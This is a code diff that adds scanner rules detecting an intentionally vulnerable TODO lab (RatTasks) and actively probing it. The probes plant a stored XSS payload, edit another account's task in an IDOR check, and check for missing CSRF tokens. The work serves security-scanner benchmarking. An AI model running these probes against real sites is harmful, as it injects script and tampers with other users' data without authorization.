@@ -10961,6 +10961,284 @@ const fabraixIndirectPromptInjectionRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+// --- RatTasks (ratdo.thexssrat.com) intentionally vulnerable TODO lab ----------------
+const RATDO_HOST_RE = /ratdo\.thexssrat\.com/i;
+
+function isRatdoHost(ctx: RuleContext): boolean {
+  const hint = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}\n${ctx.combined.slice(0, 65536)}`;
+  return RATDO_HOST_RE.test(hint);
+}
+
+const CLIENT_RATDO_RES: { label: string; re: RegExp }[] = [
+  {
+    label: "Intentionally vulnerable demo lab banner",
+    re: /INTENTIONALLY VULNERABLE DEMO LAB[\s\S]{0,120}DESIGNED TO BE HACKED/i
+  },
+  {
+    label: "RatTasks XSS/IDOR/CSRF disclosure",
+    re: /deliberate security flaws \(XSS, IDOR, CSRF, Clickjacking\)/i
+  },
+  {
+    label: "Stored XSS |safe filter oracle",
+    re: /Task titles are rendered with [`']?\|safe[`']?/i
+  },
+  {
+    label: "IDOR edit/delete/toggle routes",
+    re: /\/edit\/<id>|\/delete\/<id>|\/toggle\/<id>/i
+  },
+  {
+    label: "CSRF no protection disclosure",
+    re: /There(?:'|&#x27;)s no CSRF protection|no CSRF protection/i
+  }
+];
+
+const clientSideRatTasksEvidence: Rule = async (ctx) => {
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of CLIENT_RATDO_RES) {
+    const m = ctx.combined.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 2) return NEGATIVE;
+  if (!RATDO_HOST_RE.test(ctx.combined)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hits.length >= 3 ? 0.91 : 0.88,
+    evidence: {
+      markers: hits.slice(0, 4),
+      note: "RatTasks (The-XSS-Rat/RatDo) documents intentional XSS, IDOR, CSRF, and clickjacking flaws for scanner benchmarking"
+    }
+  };
+};
+
+function ratdoSessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
+  return doc.setCookies.find((c) => /^session=/i.test(c))?.split(";")[0] ?? null;
+}
+
+async function ratdoRegisterAndLoginCookie(ctx: RuleContext): Promise<string | null> {
+  const username = `thugir_rt_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const password = "ThugirTest123!";
+  const registerDoc = await ctx.probe.get(new URL("/register", ctx.origin).toString(), {
+    method: "POST",
+    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  let cookie = ratdoSessionCookieFromDoc(registerDoc);
+  if (!cookie) return null;
+  const loginDoc = await ctx.probe.get(new URL("/login", ctx.origin).toString(), {
+    method: "POST",
+    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  cookie = ratdoSessionCookieFromDoc(loginDoc) ?? cookie;
+  if (![301, 302, 303, 307, 308].includes(loginDoc.status)) return null;
+  const location = loginDoc.headers["location"] || "";
+  if (!/^\/(?:$|\?)/.test(location) && location !== ctx.origin && !location.endsWith("/")) return null;
+  return cookie;
+}
+
+const RATDO_XSS_PROBE = '<img src=x onerror=alert(1)>';
+const RATDO_XSS_MARKER = /<img\s+src=x\s+onerror=alert\(1\)>/i;
+
+async function probeRatdoStoredXss(ctx: RuleContext): Promise<{
+  addUrl: string;
+  homeUrl: string;
+  snippet: string;
+} | null> {
+  let cookie = await ratdoRegisterAndLoginCookie(ctx);
+  if (!cookie) return null;
+  const addUrl = new URL("/", ctx.origin).toString();
+  const addDoc = await ctx.probe.get(addUrl, {
+    method: "POST",
+    body: `title=${encodeURIComponent(RATDO_XSS_PROBE)}`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  cookie = ratdoSessionCookieFromDoc(addDoc) ?? cookie;
+  const homeUrl = new URL("/", ctx.origin).toString();
+  const homeDoc = await ctx.probe.get(homeUrl, {
+    maxBytes: 65536,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (homeDoc.status < 200 || homeDoc.status >= 400) return null;
+  const match = homeDoc.body.match(RATDO_XSS_MARKER);
+  if (!match) return null;
+  return {
+    addUrl,
+    homeUrl,
+    snippet: match[0].slice(0, 160)
+  };
+}
+
+const ratdoStoredXssLiveOracle: Rule = async (ctx) => {
+  if (!isRatdoHost(ctx)) return NEGATIVE;
+  const probe = await probeRatdoStoredXss(ctx);
+  if (!probe) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      ...probe,
+      note: "RatTasks POST / stores task titles rendered with |safe — <img src=x onerror=alert(1)> persists unsanitized in task list (stored XSS oracle)"
+    }
+  };
+};
+
+async function probeRatdoIdorEdit(ctx: RuleContext): Promise<{
+  victimTaskId: string;
+  editUrl: string;
+  victimMarker: string;
+  attackerMarker: string;
+} | null> {
+  const victimUser = `thugir_rt_v_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const attackerUser = `thugir_rt_a_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const password = "ThugirTest123!";
+  const victimMarker = `thugir-victim-${Math.random().toString(36).slice(2, 8)}`;
+  const attackerMarker = `thugir-idor-${Math.random().toString(36).slice(2, 8)}`;
+
+  async function sessionFor(user: string): Promise<string | null> {
+    const registerDoc = await ctx.probe.get(new URL("/register", ctx.origin).toString(), {
+      method: "POST",
+      body: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(password)}`,
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    let cookie = ratdoSessionCookieFromDoc(registerDoc);
+    if (!cookie) return null;
+    const loginDoc = await ctx.probe.get(new URL("/login", ctx.origin).toString(), {
+      method: "POST",
+      body: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(password)}`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Cookie: cookie
+      },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    return ratdoSessionCookieFromDoc(loginDoc) ?? cookie;
+  }
+
+  let vCookie = await sessionFor(victimUser);
+  if (!vCookie) return null;
+  const addDoc = await ctx.probe.get(new URL("/", ctx.origin).toString(), {
+    method: "POST",
+    body: `title=${encodeURIComponent(victimMarker)}`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: vCookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  vCookie = ratdoSessionCookieFromDoc(addDoc) ?? vCookie;
+  const victimHome = await ctx.probe.get(new URL("/", ctx.origin).toString(), {
+    maxBytes: 65536,
+    timeoutMs: 15000,
+    headers: { Cookie: vCookie }
+  });
+  const escapedMarker = victimMarker.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  const taskMatch =
+    victimHome.body.match(new RegExp(`${escapedMarker}[\\s\\S]{0,480}?href='/edit/(\\d+)'`, "i")) ??
+    victimHome.body.match(new RegExp(`href='/edit/(\\d+)'[\\s\\S]{0,480}?${escapedMarker}`, "i"));
+  const taskId = taskMatch?.[1];
+  if (!taskId) return null;
+
+  const attackerCookie = await sessionFor(attackerUser);
+  if (!attackerCookie) return null;
+  const editUrl = new URL(`/edit/${taskId}`, ctx.origin).toString();
+  await ctx.probe.get(editUrl, {
+    method: "POST",
+    body: `title=${encodeURIComponent(attackerMarker)}`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: attackerCookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const confirmHome = await fetchDoc(new URL("/", ctx.origin).toString(), {
+    maxBytes: 65536,
+    timeoutMs: 15000,
+    headers: { Cookie: vCookie }
+  });
+  if (!new RegExp(attackerMarker.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).test(confirmHome.body)) return null;
+  return { victimTaskId: taskId, editUrl, victimMarker, attackerMarker };
+}
+
+const ratdoIdorEditLiveOracle: Rule = async (ctx) => {
+  if (!isRatdoHost(ctx)) return NEGATIVE;
+  const probe = await probeRatdoIdorEdit(ctx);
+  if (!probe) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      ...probe,
+      note: "RatTasks POST /edit/:id accepts edits from a different authenticated user without ownership check — IDOR/BAC on task edit oracle"
+    }
+  };
+};
+
+const ratdoCsrfLiveOracle: Rule = async (ctx) => {
+  if (!isRatdoHost(ctx)) return NEGATIVE;
+  let cookie = await ratdoRegisterAndLoginCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  const homeUrl = new URL("/", ctx.origin).toString();
+  const addDoc = await ctx.probe.get(homeUrl, {
+    method: "POST",
+    body: `title=${encodeURIComponent("thugir-csrf-probe-task")}`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  cookie = ratdoSessionCookieFromDoc(addDoc) ?? cookie;
+  const homeDoc = await ctx.probe.get(homeUrl, {
+    maxBytes: 65536,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (homeDoc.status < 200 || homeDoc.status >= 400) return NEGATIVE;
+  const hasPostForm = /<form[^>]+method=['"]post['"]/i.test(homeDoc.body);
+  const lacksCsrfInput = !/<input[^>]+name=['"][^'"]*(?:csrf|_token)[^'"]*['"]/i.test(homeDoc.body);
+  const hasGetDelete = /href=['"]\/delete\/\d+['"]/i.test(homeDoc.body);
+  const hasGetToggle = /window\.location=['"]\/toggle\/\d+['"]/i.test(homeDoc.body);
+  if (!hasPostForm || !lacksCsrfInput || !hasGetDelete || !hasGetToggle) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: homeUrl,
+      hasPostForm,
+      hasGetDelete,
+      hasGetToggle,
+      note: "RatTasks task forms lack CSRF tokens and expose state-changing GET /delete/:id and /toggle/:id endpoints — CSRF oracle (The-XSS-Rat/RatDo)"
+    }
+  };
+};
+
 const PROMPT_SHIELD_API_ORIGIN = "https://promptshield-production-858a.up.railway.app";
 const PROMPT_SHIELD_HOST_RE =
   /prompt-shield1\.vercel\.app|promptshield-production[-a-z0-9]*\.up\.railway\.app/i;
@@ -93084,6 +93362,9 @@ export const RULES: Record<string, Rule> = {
   fabraixDataExfil002RouteLiveOracle,
   fabraixDataExfil001RouteLiveOracle,
   fabraixIndirectPromptInjectionRouteLiveOracle,
+  ratdoStoredXssLiveOracle,
+  ratdoIdorEditLiveOracle,
+  ratdoCsrfLiveOracle,
   promptShieldPromptInjectionDefenseLiveOracle,
   promptShieldPromptInjectionDefenseRouteLiveOracle,
   clientSideBugzapPromptDefenseEvidence,
